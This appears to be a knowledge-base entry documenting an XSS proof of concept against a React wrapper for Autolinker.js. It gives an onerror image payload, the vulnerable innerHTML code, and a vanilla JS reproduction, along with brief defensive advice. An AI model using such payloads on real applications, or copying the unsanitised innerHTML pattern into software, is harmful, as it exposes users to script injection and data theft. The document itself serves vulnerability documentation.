---
id: proc-xss-trigger-payload-001
tags:
  - xss
  - payload
  - exploitation
type: procedure
tools:
  - '[[tools/react-autolinker-wrapper]]'
  - '[[tools/Autolinker.js]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/inject-malicious-xss-payload]]'
  - '[[commands/observe-invokelink-execution]]'
  - '[[commands/vanilla-js-xss-poc]]'
verified: false
platforms:
  - Web
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:02.633Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-with-Malicious-Input

## Summary

This procedure injects a malicious HTML/JS payload into the input field, exploiting the library's innerHTML assignment to execute arbitrary code, demonstrating remote code execution via XSS.

## Description

By entering a payload like '<img src=x onerror=alert()>', the state updates and AutolinkerWrapper's invokeLink sets innerHTML to the unsanitized output, executing the script. Impacts users of apps using this library for auto-linking; can lead to data theft or hijacking. Requires the full app setup; tested in browser.

## Requirements

1. Fully rendered vulnerable React app
2. Browser dev tools open for monitoring
3. No CSP blocking inline scripts

## Defense

Defensive measures and detection strategies:

- Enable strict CSP to block inline scripts
- Sanitize inputs with HTML entity encoding or libraries
- Audit third-party libs for XSS (e.g., via Snyk)

## Objectives

1. Inject and execute malicious payload
2. Confirm arbitrary JS execution
3. Simulate real-world impact like alerts or data exfil

## Instructions

### Step 1: Enter Malicious Payload

**Context**: Provide input that includes executable HTML/JS to trigger onerror.

**Command** ([[commands/inject-malicious-xss-payload]]):
```javascript
// Enter into the input field: '<img src=x onerror=alert()>'
```

> Updates state.text. Expected output: Payload processed by Autolinker.

### Step 2: Observe innerHTML Execution

**Context**: The wrapper's method sets innerHTML, executing the script.

**Command** ([[commands/observe-invokelink-execution]]):
```javascript
invokeLink = () => {
  this.element.innerHTML = this.props.options == defaultOptions
    ? Autolinker.link(this.props.text)
    : Autolinker.link(this.props.text, this.props.options)
}
```

> Monitors execution. Expected output: Alert pops up.

### Step 3: Vanilla JS PoC Alternative

**Context**: Test directly with Autolinker.js for confirmation.

**Command** ([[commands/vanilla-js-xss-poc]]):
```javascript
document.getElementsByTagName('input')[0]
.addEventListener('change',e=>{
  document.getElementsByTagName('div')[0].innerHTML = Autolinker.link(e.srcElement.value);
});
```

> Attaches listener. Expected output: XSS on input change.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/inject-malicious-xss-payload]]
- [[commands/observe-invokelink-execution]]
- [[commands/vanilla-js-xss-poc]]

## Tools Used

- [[tools/react-autolinker-wrapper]]
- [[tools/Autolinker.js]]

## Tags

- xss
- payload
- exploitation
